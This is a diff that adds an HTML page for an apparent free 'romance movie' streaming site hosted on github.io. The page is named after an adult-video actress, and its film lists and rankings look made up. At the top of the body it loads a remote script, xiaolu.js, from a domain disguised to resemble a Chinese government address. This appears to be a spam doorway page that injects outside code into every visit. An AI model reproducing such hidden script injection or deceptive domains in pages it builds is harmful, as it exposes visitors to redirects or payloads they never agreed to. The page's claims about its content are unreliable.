@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>天海翼爱情电影网 - 爱情电影在线观看 | 浪漫高清影视资源平台</title>
+<meta name="keywords" content="天海翼爱情电影网,爱情电影,爱情片,在线观看,高清电影,浪漫影视,电影网">
+<meta name="description" content="天海翼爱情电影网(tianhaiyiaiqingdianyingwang-wap.github.io)专注爱情电影在线观看，海量浪漫高清影视资源每日更新，甜蜜、虐恋、青春、治愈各类爱情片随心看，移动端自适应，随时随地邂逅好故事。">
+<meta name="author" content="天海翼爱情电影网">
+<meta name="copyright" content="天海翼爱情电影网">
+<meta name="theme-color" content="#1a0b16">
+<meta property="og:type" content="website">
+<meta property="og:title" content="天海翼爱情电影网 - 爱情电影在线观看">
+<meta property="og:description" content="天海翼爱情电影网专注爱情电影在线观看，海量浪漫高清影视资源每日更新，甜蜜虐恋随心看。">
+<meta property="og:url" content="https://tianhaiyiaiqingdianyingwang-wap.github.io/">
+<meta property="og:site_name" content="天海翼爱情电影网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="天海翼爱情电影网 - 爱情电影在线观看">
+<meta name="twitter:description" content="天海翼爱情电影网专注爱情电影在线观看，海量浪漫高清影视资源每日更新。">
+<link rel="canonical" href="https://tianhaiyiaiqingdianyingwang-wap.github.io/">
+<style>
+/* ============ 基础重置 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;scroll-padding-top:72px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:#150a12;color:#f3e6ec;line-height:1.7;font-size:16px;overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:color .2s}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.container{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ============ 顶部导航 ============ */
+.site-header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(21,10,18,.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(233,30,99,.25);
+}
+.nav-wrap{display:flex;align-items:center;justify-content:space-between;height:68px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:800;font-size:20px;letter-spacing:.3px}
+.logo-heart{font-size:26px;filter:drop-shadow(0 2px 8px rgba(233,30,99,.6))}
+.logo-text{color:#fff}
+.logo-text span{color:#e91e63}
+.nav-links{display:flex;gap:4px;align-items:center}
+.nav-links a{
+  padding:9px 15px;border-radius:8px;font-size:15px;color:#e6d3db;font-weight:500;position:relative;
+}
+.nav-links a:hover{color:#fff;background:rgba(233,30,99,.15)}
+.menu-toggle{display:none;width:44px;height:44px;align-items:center;justify-content:center;font-size:24px;color:#fff}
+
+/* ============ Hero ============ */
+.hero{
+  margin-top:68px;min-height:88vh;display:flex;align-items:center;position:relative;overflow:hidden;
+  background:radial-gradient(1000px 600px at 85% 0%,rgba(233,30,99,.28),transparent 60%),
+             radial-gradient(800px 500px at 0% 90%,rgba(156,39,176,.3),transparent 60%),
+             linear-gradient(155deg,#1a0b16,#2b1024);
+}
+.hero-inner{position:relative;z-index:2;padding:72px 0}
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:8px;padding:7px 18px;border-radius:40px;
+  background:rgba(233,30,99,.12);border:1px solid rgba(233,30,99,.5);color:#ff8fa8;font-size:14px;margin-bottom:26px;
+}
+.hero h1{font-size:clamp(34px,6vw,62px);line-height:1.16;font-weight:900;color:#fff;margin-bottom:22px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#ff5e9c,#ff8a5c);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-sub{font-size:18px;color:#ddc6d0;max-width:620px;margin-bottom:34px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:50px;font-weight:700;font-size:16px}
+.btn-primary{background:linear-gradient(135deg,#e91e63,#c2185b);color:#fff;box-shadow:0 8px 26px rgba(233,30,99,.4)}
+.btn-primary:hover{transform:translateY(-2px)}
+.btn-ghost{border:1px solid rgba(255,255,255,.3);color:#fff}
+.btn-ghost:hover{background:rgba(255,255,255,.08)}
+.hero-stats{display:flex;gap:44px;margin-top:46px;flex-wrap:wrap}
+.stat-num{font-size:30px;font-weight:900;color:#fff}
+.stat-label{font-size:13px;color:#b59aa6}
+
+/* ============ 通用区块 ============ */
+section{padding:82px 0;position:relative}
+.sec-head{text-align:center;margin-bottom:52px}
+.sec-tag{color:#ff5e9c;font-weight:700;font-size:13px;letter-spacing:3px;text-transform:uppercase}
+.sec-head h2{font-size:clamp(26px,4vw,40px);color:#fff;margin-top:8px;font-weight:900}
+.sec-head p{color:#b59aa6;margin-top:12px;font-size:16px}
+
+/* ============ 栏目一：影片库 ============ */
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:24px}
+.film{
+  background:#1d0f18;border-radius:18px;overflow:hidden;border:1px solid rgba(255,255,255,.06);
+  transition:transform .28s,box-shadow .28s;
+}
+.film:hover{transform:translateY(-7px);box-shadow:0 18px 44px rgba(0,0,0,.5)}
+.cover{position:relative;aspect-ratio:3/4;background:linear-gradient(140deg,var(--a,#5c1745),var(--b,#1d0f18))}
+.cover-tag{
+  position:absolute;top:12px;left:12px;background:rgba(233,30,99,.95);color:#fff;font-size:12px;
+  padding:4px 11px;border-radius:6px;font-weight:700;
+}
+.cover-rate{
+  position:absolute;top:12px;right:12px;background:rgba(0,0,0,.55);color:#ffd54a;font-size:13px;
+  padding:4px 10px;border-radius:6px;font-weight:700;
+}
+.cover-name{
+  position:absolute;inset:auto 0 0;padding:32px 16px 16px;
+  background:linear-gradient(to top,rgba(0,0,0,.94),transparent);color:#fff;font-weight:700;font-size:17px;text-align:center;
+}
+.film-body{padding:15px 16px}
+.film-body h3{font-size:16px;color:#fff;margin-bottom:8px}
+.film-body .row{display:flex;justify-content:space-between;font-size:13px;color:#9a7d88}
+.film-body .row a{color:#e91e63;font-weight:600}
+
+/* ============ 栏目二：影片分类 ============ */
+.cats-wrap{background:linear-gradient(180deg,#190d15,#150a12);border-radius:28px;padding:44px 36px}
+.cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:16px}
+.cat{
+  text-align:center;padding:30px 14px;border-radius:18px;background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.07);transition:all .26s;
+}
+.cat:hover{background:rgba(233,30,99,.13);border-color:rgba(233,30,99,.55);transform:translateY(-5px)}
+.cat-ic{font-size:40px;display:block;margin-bottom:12px}
+.cat h3{color:#fff;font-size:17px;margin-bottom:4px}
+.cat p{color:#8a6f7c;font-size:13px}
+
+/* ============ 栏目三：热播排行榜 ============ */
+.rank{display:flex;flex-direction:column;gap:14px;max-width:920px;margin:0 auto}
+.rk{display:flex;align-items:center;gap:20px;padding:18px 22px;background:#1d0f18;border-radius:14px;border-left:4px solid transparent;transition:all .22s}
+.rk:hover{border-left-color:#e91e63;background:#241328}
+.rk-n{font-size:28px;font-weight:900;color:#4a3340;min-width:48px}
+.rk.top .rk-n{color:#e91e63}
+.rk-c{flex:1}
+.rk-c h3{color:#fff;font-size:17px}
+.rk-c p{color:#8a6f7c;font-size:13px}
+.rk-v{color:#ff5e9c;font-weight:700;font-size:14px;white-space:nowrap}
+
+/* ============ 栏目四：最新更新 ============ */
+.tl{position:relative;max-width:860px;margin:0 auto;padding-left:32px}
+.tl::before{content:"";position:absolute;left:9px;top:8px;bottom:8px;width:2px;background:linear-gradient(#e91e63,#9c27b0)}
+.tl-i{position:relative;margin-bottom:26px;background:#1d0f18;padding:22px 24px;border-radius:16px;border:1px solid rgba(255,255,255,.06)}
+.tl-i::before{content:"";position:absolute;left:-29px;top:28px;width:14px;height:14px;border-radius:50%;background:#e91e63;box-shadow:0 0 0 4px #150a12,0 0 14px #e91e63}
+.tl-d{color:#ff5e9c;font-size:13px;font-weight:700}
+.tl-i h3{color:#fff;font-size:18px;margin:6px 0}
+.tl-i p{color:#b59aa6;font-size:14px}
+
+/* ============ 栏目五：关于我们 ============ */
+.about-box{max-width:940px;margin:0 auto;background:linear-gradient(145deg,#24101d,#1a0b16);border-radius:24px;padding:46px;border:1px solid rgba(255,255,255,.07)}
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:42px;align-items:center}
+.about-box h2{color:#fff;font-size:28px;margin-bottom:16px}
+.about-box p{color:#ddc6d0;margin-bottom:14px}
+.about-pts{margin-top:20px}
+.about-pts li{display:flex;gap:10px;align-items:flex-start;padding:8px 0;color:#e6d3db}
+.about-pts li::before{content:"♥";color:#e91e63;font-weight:900;flex-shrink:0}
+.about-side{display:grid;gap:14px}
+.info{background:rgba(255,255,255,.03);border-radius:16px;padding:22px;border:1px solid rgba(255,255,255,.07)}
+.info h4{color:#ff5e9c;margin-bottom:8px;font-size:15px}
+.info p{color:#9a7d88;font-size:14px;line-height:1.65}
+
+/* ============ 栏目六：常见问题 ============ */
+.faq-list{max-width:860px;margin:0 auto;display:flex;flex-direction:column;gap:12px}
+.faq{background:#1d0f18;border-radius:14px;overflow:hidden;border:1px solid rgba(255,255,255,.06)}
+.faq-q{width:100%;text-align:left;padding:20px 22px;color:#fff;font-size:17px;font-weight:600;display:flex;justify-content:space-between;align-items:center;gap:14px}
+.faq-q .ic{color:#e91e63;font-size:22px;transition:transform .25s;flex-shrink:0}
+.faq.open .faq-q .ic{transform:rotate(45deg)}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease}
+.faq-a-in{padding:0 22px 22px;color:#b59aa6;font-size:15px}
+
+/* ============ 页脚 ============ */
+.site-footer{background:#0d050a;padding:52px 0 26px;border-top:1px solid rgba(255,255,255,.06)}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:36px}
+.foot-brand h3{color:#fff;font-size:20px;margin-bottom:10px}
+.foot-brand h3 span{color:#e91e63}
+.foot-brand p{color:#8a6f7c;font-size:14px}
+.foot-col h4{color:#fff;font-size:16px;margin-bottom:14px}
+.foot-col a{display:block;color:#9a7d88;padding:5px 0;font-size:14px}
+.foot-col a:hover{color:#e91e63}
+.foot-bot{text-align:center;padding-top:24px;border-top:1px solid rgba(255,255,255,.06);color:#7a5f6c;font-size:13px}
+
+/* ============ 回到顶部 ============ */
+.to-top{
+  position:fixed;right:20px;bottom:24px;width:46px;height:46px;border-radius:50%;
+  background:#e91e63;color:#fff;display:none;align-items:center;justify-content:center;font-size:20px;z-index:999;
+  box-shadow:0 6px 20px rgba(233,30,99,.4);
+}
+.to-top.show{display:flex}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+  .about-grid{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .menu-toggle{display:flex}
+  .nav-links{
+    position:fixed;top:68px;left:0;right:0;flex-direction:column;align-items:stretch;gap:0;
+    background:#16090f;border-bottom:1px solid rgba(255,255,255,.07);padding:12px;
+    transform:translateY(-120%);opacity:0;pointer-events:none;transition:all .3s;
+  }
+  .nav-links.open{transform:translateY(0);opacity:1;pointer-events:auto}
+  .nav-links a{padding:14px 16px}
+  .hero{text-align:center}
+  .hero-sub{margin-left:auto;margin-right:auto}
+  .hero-actions{justify-content:center}
+  .hero-stats{justify-content:center;gap:28px}
+  section{padding:60px 0}
+  .sec-head{margin-bottom:34px}
+  .films{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+  .film-body h3{font-size:15px}
+  .rk{flex-wrap:wrap;gap:10px}
+  .rk-v{width:100%}
+  .about-box{padding:28px 22px}
+  .cats-wrap{padding:28px 20px;border-radius:22px}
+  .foot{grid-template-columns:1fr}
+}
+@media(max-width:420px){
+  .hero-stats{gap:20px}
+  .stat-num{font-size:24px}
+  .btn{padding:13px 22px;font-size:15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 顶部导航 ===== -->
+<header class="site-header">
+  <div class="container nav-wrap">
+    <a href="#" class="logo" aria-label="天海翼爱情电影网首页">
+      <span class="logo-heart">❤</span>
+      <span class="logo-text">天海翼<span>爱情电影网</span></span>
+    </a>
+    <nav class="nav-links" id="navLinks" aria-label="主导航">
+      <a href="#films">影片库</a>
+      <a href="#categories">影片分类</a>
+      <a href="#ranking">热播排行</a>
+      <a href="#update">最新更新</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="menu-toggle" id="menuToggle" aria-label="打开菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="container hero-inner">
+    <span class="hero-eyebrow">❤ 每日更新 · 浪漫高清爱情电影</span>
+    <h1>邂逅每一段<em>浪漫爱情</em><br>就来 天海翼爱情电影网</h1>
+    <p class="hero-sub">天海翼爱情电影网(tianhaiyiaiqingdianyingwang-wap.github.io)专注爱情电影在线观看，汇聚甜蜜、虐恋、青春、治愈等海量浪漫影视资源，支持手机端高清观看，随时随地邂逅好故事。</p>
+    <div class="hero-actions">
+      <a href="#films" class="btn btn-primary">立即观影 →</a>
+      <a href="#categories" class="btn btn-ghost">浏览分类</a>
+    </div>
+    <div class="hero-stats">
+      <div><div class="stat-num">8000+</div><div class="stat-label">爱情影视</div></div>
+      <div><div class="stat-num">24H</div><div class="stat-label">实时更新</div></div>
+      <div><div class="stat-num">1080P</div><div class="stat-label">高清画质</div></div>
+      <div><div class="stat-num">免费</div><div class="stat-label">畅享观影</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：影片库 ===== -->
+<section id="films">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">Film Library</span>
+      <h2>精选爱情影片库</h2>
+      <p>海量浪漫高清电影在线观看，甜蜜虐恋一网打尽</p>
+    </div>
+    <div class="films" id="filmsWrap"><!-- JS 渲染 --></div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：影片分类 ===== -->
+<section id="categories">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">Categories</span>
+      <h2>影片分类</h2>
+      <p>按情感类型精准筛选，快速找到心动的那一部</p>
+    </div>
+    <div class="cats-wrap">
+      <div class="cats">
+        <a href="#" class="cat"><span class="cat-ic">🍬</span><h3>甜蜜爱情</h3><p>齁甜恋爱</p></a>
+        <a href="#" class="cat"><span class="cat-ic">💔</span><h3>虐恋情深</h3><p>催泪催心</p></a>
+        <a href="#" class="cat"><span class="cat-ic">🌸</span><h3>青春校园</h3><p>纯美初恋</p></a>
+        <a href="#" class="cat"><span class="cat-ic">🏙️</span><h3>都市情感</h3><p>职场情缘</p></a>
+        <a href="#" class="cat"><span class="cat-ic">🌿</span><h3>治愈系</h3><p>温柔暖心</p></a>
+        <a href="#" class="cat"><span class="cat-ic">🕰️</span><h3>穿越时空</h3><p>奇幻之恋</p></a>
+        <a href="#" class="cat"><span class="cat-ic">💍</span><h3>婚姻家庭</h3><p>烟火温情</p></a>
+        <a href="#" class="cat"><span class="cat-ic">🎭</span><h3>经典怀旧</h3><p>永恒光影</p></a>
+        <a href="#" class="cat"><span class="cat-ic">📺</span><h3>偶像剧</h3><p>追剧上头</p></a>
+        <a href="#" class="cat"><span class="cat-ic">✨</span><h3>奇幻浪漫</h3><p>脑洞恋爱</p></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：热播排行榜 ===== -->
+<section id="ranking">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">Top Ranking</span>
+      <h2>热播排行榜</h2>
+      <p>实时统计播放量，最动人的爱情故事都在这里</p>
+    </div>
+    <div class="rank">
+      <div class="rk top"><span class="rk-n">01</span><div class="rk-c"><h3>余生有你</h3><p>都市情感 · 2026 · 9.3分</p></div><span class="rk-v">❤ 1320万播放</span></div>
+      <div class="rk top"><span class="rk-n">02</span><div class="rk-c"><h3>初恋那件小事</h3><p>青春校园 · 2026 · 9.1分</p></div><span class="rk-v">❤ 1010万播放</span></div>
+      <div class="rk top"><span class="rk-n">03</span><div class="rk-c"><h3>时光里的她</h3><p>穿越时空 · 2026 · 9.0分</p></div><span class="rk-v">❤ 894万播放</span></div>
+      <div class="rk"><span class="rk-n">04</span><div class="rk-c"><h3>甜度超标</h3><p>甜蜜爱情 · 2026 · 8.8分</p></div><span class="rk-v">❤ 782万播放</span></div>
+      <div class="rk"><span class="rk-n">05</span><div class="rk-c"><h3>失忆后我嫁给了他</h3><p>虐恋情深 · 2026 · 8.7分</p></div><span class="rk-v">❤ 710万播放</span></div>
+      <div class="rk"><span class="rk-n">06</span><div class="rk-c"><h3>治愈系房东</h3><p>治愈系 · 2026 · 8.6分</p></div><span class="rk-v">❤ 645万播放</span></div>
+      <div class="rk"><span class="rk-n">07</span><div class="rk-c"><h3>婚前一百天</h3><p>婚姻家庭 · 2026 · 8.5分</p></div><span class="rk-v">❤ 573万播放</span></div>
+      <div class="rk"><span class="rk-n">08</span><div class="rk-c"><h3>星河不及你</h3><p>奇幻浪漫 · 2026 · 8.4分</p></div><span class="rk-v">❤ 506万播放</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：最新更新 ===== -->
+<section id="update">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">Latest Update</span>
+      <h2>最新更新</h2>
+      <p>每日更新浪漫影视资源，第一时间追心动新剧</p>
+    </div>
+    <div class="tl">
+      <div class="tl-i"><span class="tl-d">2026-10-10 更新</span><h3>《余生有你》全集上线</h3><p>都市情感力作，讲述职场男女从相遇到相守的温暖故事，甜而不腻。</p></div>
+      <div class="tl-i"><span class="tl-d">2026-10-09 更新</span><h3>《时光里的她》独家上线</h3><p>穿越时空的奇幻之恋，跨越年代的心动邂逅，催泪指数爆表。</p></div>
+      <div class="tl-i"><span class="tl-d">2026-10-08 更新</span><h3>《初恋那件小事》重制版</h3><p>青春校园纯美初恋，唤醒每个人心底的青春记忆。</p></div>
+      <div class="tl-i"><span class="tl-d">2026-10-07 更新</span><h3>经典老片高清修复专区</h3><p>多部影史经典爱情片高清修复，重温那些年的心动瞬间。</p></div>
+      <div class="tl-i"><span class="tl-d">2026-10-06 更新</span><h3>偶像剧专区新增15部</h3><p>热门新番持续更新，甜剧爱好者不容错过。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：关于我们 ===== -->
+<section id="about">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">About Us</span>
+      <h2>关于 天海翼爱情电影网</h2>
+      <p>专注爱情电影在线观看，做你随身的心动影院</p>
+    </div>
+    <div class="about-box">
+      <div class="about-grid">
+        <div>
+          <h2>随时随地，邂逅每一段心动</h2>
+          <p>天海翼爱情电影网（网址：https://tianhaiyiaiqingdianyingwang-wap.github.io）是一个专注于爱情电影在线观看的影视平台，致力于为用户提供丰富、浪漫的观影体验。</p>
+          <p>平台涵盖甜蜜爱情、虐恋情深、青春校园、都市情感、治愈系、穿越时空、婚姻家庭等多种情感类型，资源每日更新，满足不同用户的心动需求。</p>
+          <ul class="about-pts">
+            <li>海量爱情影视资源，热门新剧实时同步</li>
+            <li>高清画质在线观看，流畅不卡顿</li>
+            <li>移动端自适应，手机平板随心看</li>
+            <li>简洁界面设计，操作零门槛</li>
+            <li>完全免费，无需注册即可畅享</li>
+          </ul>
+        </div>
+        <div class="about-side">
+          <div class="info"><h4>📱 多端适配</h4><p>页面采用响应式设计，完美适配手机、平板、电脑等各种屏幕尺寸。</p></div>
+          <div class="info"><h4>⚡ 极速加载</h4><p>精简代码结构，无冗余依赖，打开即看，告别漫长等待。</p></div>
+          <div class="info"><h4>🎯 精准推荐</h4><p>按情感类型、热度、更新时间多维度整理，帮你快速找到心动的那一部。</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目六：常见问题 ===== -->
+<section id="faq">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-tag">FAQ</span>
+      <h2>常见问题</h2>
+      <p>你想知道的，这里都有答案</p>
+    </div>
+    <div class="faq-list">
+      <div class="faq">
+        <button class="faq-q">天海翼爱情电影网需要注册登录吗？<span class="ic">＋</span></button>
+        <div class="faq-a"><div class="faq-a-in">不需要。平台支持免注册在线观看，打开页面即可畅享海量爱情影视资源，简单便捷。</div></div>
+      </div>
+      <div class="faq">
+        <button class="faq-q">网站支持手机端观看吗？<span class="ic">＋</span></button>
+        <div class="faq-a"><div class="faq-a-in">支持。本网站采用移动端自适应设计，无论是手机、平板还是电脑，都能获得流畅的浏览和观影体验。</div></div>
+      </div>
+      <div class="faq">
+        <button class="faq-q">影片资源多久更新一次？<span class="ic">＋</span></button>
+        <div class="faq-a"><div class="faq-a-in">平台每日更新热门爱情影视资源，第一时间同步最新上映影片与热门剧集，敬请持续关注。</div></div>
+      </div>
+      <div class="faq">
+        <button class="faq-q">如何快速找到想看的爱情片？<span class="ic">＋</span></button>
+        <div class="faq-a"><div class="faq-a-in">可通过「影片分类」栏目按情感类型筛选，或查看「热播排行」与「最新更新」栏目发现热门好片。</div></div>
+      </div>
+      <div class="faq">
+        <button class="faq-q">网站内容都是高清画质吗？<span class="ic">＋</span></button>
+        <div class="faq-a"><div class="faq-a-in">平台提供的影视资源以高清画质为主，支持多种清晰度选择，让你尽享影院级观影体验。</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="site-footer">
+  <div class="container">
+    <div class="foot">
+      <div class="foot-brand">
+        <h3>天海翼<span>爱情电影网</span></h3>
+        <p>专注爱情电影在线观看的影视平台，海量浪漫影视资源每日更新，免费畅享好片。</p>
+      </div>
+      <div class="foot-col">
+        <h4>栏目导航</h4>
+        <a href="#films">影片库</a>
+        <a href="#categories">影片分类</a>
+        <a href="#ranking">热播排行</a>
+        <a href="#update">最新更新</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于平台</h4>
+        <a href="#about">关于我们</a>
+        <a href="#faq">常见问题</a>
+        <a href="#">服务条款</a>
+        <a href="#">免责声明</a>
+      </div>
+      <div class="foot-col">
+        <h4>情感类型</h4>
+        <a href="#">甜蜜 · 虐恋 · 青春</a>
+        <a href="#">都市 · 治愈 · 穿越</a>
+        <a href="#">婚姻 · 经典 · 奇幻</a>
+        <a href="#">偶像剧专区</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      © 2026 天海翼爱情电影网 (tianhaiyiaiqingdianyingwang-wap.github.io) 版权所有 · 本站仅提供影视信息展示服务
+    </div>
+  </div>
+</footer>
+
+<a href="#" class="to-top" id="toTop" aria-label="回到顶部">↑</a>
+
+<script>
+// ===== 影片库数据渲染 =====
+var films=[
+  {t:"余生有你",c:"都市情感 / 2026",s:9.3,a:"#7b1fa2",b:"#c2185b"},
+  {t:"初恋那件小事",c:"青春校园 / 2026",s:9.1,a:"#ff6f91",b:"#ffc75f"},
+  {t:"时光里的她",c:"穿越时空 / 2026",s:9.0,a:"#5c6bc0",b:"#e91e63"},
+  {t:"甜度超标",c:"甜蜜爱情 / 2026",s:8.8,a:"#ff9a9e",b:"#fad0c4"},
+  {t:"失忆后我嫁给了他",c:"虐恋情深 / 2026",s:8.7,a:"#4a148c",b:"#880e4f"},
+  {t:"治愈系房东",c:"治愈系 / 2026",s:8.6,a:"#43a047",b:"#ff8a80"},
+  {t:"婚前一百天",c:"婚姻家庭 / 2026",s:8.5,a:"#e57373",b:"#f06292"},
+  {t:"星河不及你",c:"奇幻浪漫 / 2026",s:8.4,a:"#1565c0",b:"#e040fb"},
+  {t:"被暗恋的夏天",c:"青春校园 / 2026",s:8.6,a:"#ff7043",b:"#f48fb1"},
+  {t:"如果声音记得",c:"虐恋情深 / 2026",s:8.3,a:"#6a1b9a",b:"#e91e63"},
+  {t:"合约恋人",c:"都市情感 / 2026",s:8.2,a:"#c2185b",b:"#7b1fa2"},
+  {t:"第二次初恋",c:"治愈系 / 2026",s:8.1,a:"#ec407a",b:"#ffd54f"}
+];
+var wrap=document.getElementById('filmsWrap');
+var html='';
+for(var i=0;i<films.length;i++){
+  var f=films[i];
+  html+='<article class="film"><div class="cover" style="--a:'+f.a+';--b:'+f.b+'">'
+    +'<span class="cover-tag">HD</span><span class="cover-rate">★ '+f.s+'</span>'
+    +'<div class="cover-name">'+f.t+'</div></div>'
+    +'<div class="film-body"><h3>'+f.t+'</h3><div class="row"><span>'+f.c+'</span><a href="#">在线观看</a></div></div></article>';
+}
+wrap.innerHTML=html;
+
+// ===== 移动端菜单 =====
+var nav=document.getElementById('navLinks');
+document.getElementById('menuToggle').addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){
+  if(e.target.tagName==='A'){nav.classList.remove('open');}
+});
+
+// ===== FAQ 手风琴 =====
+var faqs=document.querySelectorAll('.faq');
+faqs.forEach(function(item){
+  var btn=item.querySelector('.faq-q');
+  btn.addEventListener('click',function(){
+    var isOpen=item.classList.contains('open');
+    faqs.forEach(function(o){
+      o.classList.remove('open');
+      o.querySelector('.faq-a').style.maxHeight=null;
+    });
+    if(!isOpen){
+      item.classList.add('open');
+      var ans=item.querySelector('.faq-a');
+      ans.style.maxHeight=ans.scrollHeight+40+'px';
+    }
+  });
+});
+
+// ===== 回到顶部 =====
+var toTop=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+  toTop.classList.toggle('show',window.scrollY>400);
+});
+toTop.addEventListener('click',function(e){
+  e.preventDefault();
+  window.scrollTo({top:0,behavior:'smooth'});
+});
+</script>
+</body>
+</html>
